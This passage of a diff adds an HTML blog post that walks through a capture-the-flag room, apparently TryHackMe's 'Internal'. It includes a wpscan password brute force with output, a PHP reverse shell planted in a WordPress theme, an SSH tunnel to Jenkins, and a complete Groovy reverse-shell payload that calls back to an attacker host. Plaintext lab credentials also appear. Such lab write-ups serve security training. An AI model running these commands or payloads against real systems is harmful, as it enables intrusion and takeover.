+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wpscan --url 10.10.186.60/blog -e u -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_______________________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __ _______ _____
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> / / __ &lt;span class="se">\ &lt;/span>/ ____&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span> /&lt;span class="se">\ &lt;/span> / /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>__&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>___ ___ __ _ _ __ ®
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \/&lt;/span> &lt;span class="se">\/&lt;/span> / &lt;span class="p">|&lt;/span> ___/ &lt;span class="se">\_&lt;/span>__ &lt;span class="se">\ &lt;/span>/ __&lt;span class="p">|&lt;/span>/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39;_ \
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \ /\ / | | ____) | (__| (_| | | | |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> \/ \/ |_| |_____/ \___|\__,_|_| |_|
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> WordPress Security Scanner by the WPScan Team
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Version 3.8.25
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> Sponsored by Automattic - https://automattic.com/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">_______________________________________________________________
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] URL: http://10.10.186.60/blog/ [10.10.186.60]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Started: Sun Dec 31 15:29:27 2023
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Interesting Finding(s):
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] Headers
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Headers (Passive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://codex.wordpress.org/XML-RPC_Pingback_API
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress readme found: http://10.10.186.60/blog/readme.html
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 100%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Direct Access (Aggressive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confidence: 60%
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | References:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://www.iplocation.net/defend-wordpress-from-ddos
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - https://github.com/wpscanteam/wpscan/issues/1299
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Found By: Emoji Settings (Passive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>wp-includes&lt;span class="se">\/&lt;/span>js&lt;span class="se">\/&lt;/span>wp-emoji-release.min.js?ver&lt;span class="o">=&lt;/span>5.4.2&lt;span class="s1">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | Confirmed By: Meta Generator (Passive Detection)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | - http://10.10.186.60/blog/, Match: &amp;#39;&lt;/span>WordPress 5.4.2&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> The main theme could not be detected.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Enumerating Users &lt;span class="o">(&lt;/span>via Passive and Aggressive Methods&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Brute Forcing Author IDs - Time: 00:00:00 &amp;lt;&lt;span class="o">==================================================================================================================================================================================================&lt;/span>&amp;gt; &lt;span class="o">(&lt;/span>&lt;span class="m">10&lt;/span> / 10&lt;span class="o">)&lt;/span> 100.00% Time: 00:00:00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> User&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> Identified:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Found By: Author Id Brute Forcing - Author Pattern &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Confirmed By: Login Error Messages &lt;span class="o">(&lt;/span>Aggressive Detection&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Performing password attack on Xmlrpc against &lt;span class="m">1&lt;/span> user/s
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>SUCCESS&lt;span class="o">]&lt;/span> - admin / my2boys
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Trying admin / princess7 Time: 00:04:06 &amp;lt; &amp;gt; &lt;span class="o">(&lt;/span>&lt;span class="m">3885&lt;/span> / 14348276&lt;span class="o">)&lt;/span> 0.02% ETA: ??:??:??
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Valid Combinations Found:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> Username: admin, Password: my2boys
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> No WPScan API Token given, as a result vulnerability data has not been output.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> You can get a free API token with &lt;span class="m">25&lt;/span> daily requests by registering at https://wpscan.com/register
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Finished: Sun Dec &lt;span class="m">31&lt;/span> 15:33:36 &lt;span class="m">2023&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Requests Done: &lt;span class="m">3900&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Cached Requests: &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Sent: 2.001 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Data Received: 2.3 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Memory used: 190.441 MB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Elapsed time: 00:04:09
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Seems like it worked.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Here in the posts tab I can see that there is another post, but they haven’t published it, let’s see what there is into it:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Wow, now I have another se of credential:&lt;/p>
+&lt;p>william:arnold147&lt;/p>
+&lt;p>I am going to try to enter this in the ssh and phpmyadmin page.&lt;/p>
+&lt;p>They didn’t work.&lt;/p>
+&lt;p>Ok, now I am just going to get a reverse shell, from this point is pretty easy.&lt;/p>
+&lt;p>You just want to go to the Theme Editor, and access the 404 Template, from there you can remove the php code, and plant your php reverse shell:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%203.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>From there I started my listener and got the reverse shell:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Internal-writeup-THM/main/383e5267-e2e0-4d84-a69b-749bf9862c2d_Export-decaaa4d-2c6b-4d4a-b2e6-36c0415c2dd0/Internal%206e6f52af5eac4b2abbad67bc61a655b2/Untitled%204.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Now that I am in I went to the opt folder and discovered these credentials:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">meterpreter &amp;gt; cat wp-save.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Bill,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aubreanna needed these credentials &lt;span class="k">for&lt;/span> something later. Let her know you have them and where they are.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aubreanna:bubb13guM!@#123
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So I entered from ssh:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh aubreanna@10.10.186.60
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aubreanna@10.10.186.60&lt;span class="err">&amp;#39;&lt;/span>s password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 18.04.4 LTS &lt;span class="o">(&lt;/span>GNU/Linux 4.15.0-112-generic x86_64&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System information as of Sun Dec &lt;span class="m">31&lt;/span> 21:32:39 UTC &lt;span class="m">2023&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System load: 0.0 Processes: &lt;span class="m">114&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Usage of /: 63.8% of 8.79GB Users logged in: &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Memory usage: 44% IP address &lt;span class="k">for&lt;/span> eth0: 10.10.186.60
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Swap usage: 0% IP address &lt;span class="k">for&lt;/span> docker0: 172.17.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=&lt;/span>&amp;gt; There is &lt;span class="m">1&lt;/span> zombie process.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Canonical Livepatch is available &lt;span class="k">for&lt;/span> installation.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Reduce system reboots and improve kernel security. Activate at:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/livepatch
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> packages can be updated.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates are security updates.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Mon Aug &lt;span class="m">3&lt;/span> 19:56:19 &lt;span class="m">2020&lt;/span> from 10.6.2.56
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aubreanna@internal:~$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here we can retrieve the user.txt flag, and we can also see that there is a jenkins server running in &lt;code>172.17.0.2:8080&lt;/code>&lt;/p>
+&lt;p>So I made a ssh tunnel using:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.186.60
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And from there we have a tunnel.&lt;/p>
+&lt;p>Now we can simply go to localhost:8080 and we are in the login page for jenkins.&lt;/p>
+&lt;p>From there I try to brute force the login page using ZAP.&lt;/p>
+&lt;p>&lt;img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/7fecbb84-9598-4ec2-9fa9-5ad99163bcf9/b9960a90-b48b-4c25-ac64-83f5d0a17ac0/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>As you can see I got a request much different from the others, often that means that we have what we want.&lt;/p>
+&lt;p>Now that we are into Jenkins we just need to go to the script console, and writing this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Thread.start &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">String &lt;span class="nv">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;your_machine_IP&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">int &lt;span class="nv">port&lt;/span>&lt;span class="o">=&lt;/span>&amp;lt;your_webserver_port&amp;gt;&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">String &lt;span class="nv">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;cmd.exe&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process &lt;span class="nv">p&lt;/span>&lt;span class="o">=&lt;/span>new ProcessBuilder&lt;span class="o">(&lt;/span>cmd&lt;span class="o">)&lt;/span>.redirectErrorStream&lt;span class="o">(&lt;/span>&lt;span class="nb">true&lt;/span>&lt;span class="o">)&lt;/span>.start&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>Socket &lt;span class="nv">s&lt;/span>&lt;span class="o">=&lt;/span>new Socket&lt;span class="o">(&lt;/span>host,port&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>InputStream &lt;span class="nv">pi&lt;/span>&lt;span class="o">=&lt;/span>p.getInputStream&lt;span class="o">()&lt;/span>,pe&lt;span class="o">=&lt;/span>p.getErrorStream&lt;span class="o">()&lt;/span>, &lt;span class="nv">si&lt;/span>&lt;span class="o">=&lt;/span>s.getInputStream&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>OutputStream &lt;span class="nv">po&lt;/span>&lt;span class="o">=&lt;/span>p.getOutputStream&lt;span class="o">()&lt;/span>,so&lt;span class="o">=&lt;/span>s.getOutputStream&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>!s.isClosed&lt;span class="o">()){&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>pi.available&lt;span class="o">()&lt;/span>&amp;gt;0&lt;span class="o">)&lt;/span>so.write&lt;span class="o">(&lt;/span>pi.read&lt;span class="o">())&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>pe.available&lt;span class="o">()&lt;/span>&amp;gt;0&lt;span class="o">)&lt;/span>so.write&lt;span class="o">(&lt;/span>pe.read&lt;span class="o">())&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="o">(&lt;/span>si.available&lt;span class="o">()&lt;/span>&amp;gt;0&lt;span class="o">)&lt;/span>po.write&lt;span class="o">(&lt;/span>si.read&lt;span class="o">())&lt;/span>&lt;span class="p">;&lt;/span>so.flush&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>po.flush&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>Thread.sleep&lt;span class="o">(&lt;/span>50&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>try &lt;span class="o">{&lt;/span>p.exitValue&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>break&lt;span class="p">;&lt;/span>&lt;span class="o">}&lt;/span>catch &lt;span class="o">(&lt;/span>Exception e&lt;span class="o">){}}&lt;/span>&lt;span class="p">;&lt;/span>p.destroy&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>s.close&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>cmd.exe if is windows, /bin/bash if is linux.&lt;/p>
+&lt;p>And start the listener in our machine.&lt;/p>
+&lt;p>Now that we are inside the machine we can go into the opt folder again and take the root credentials:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat note.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aubreanna,
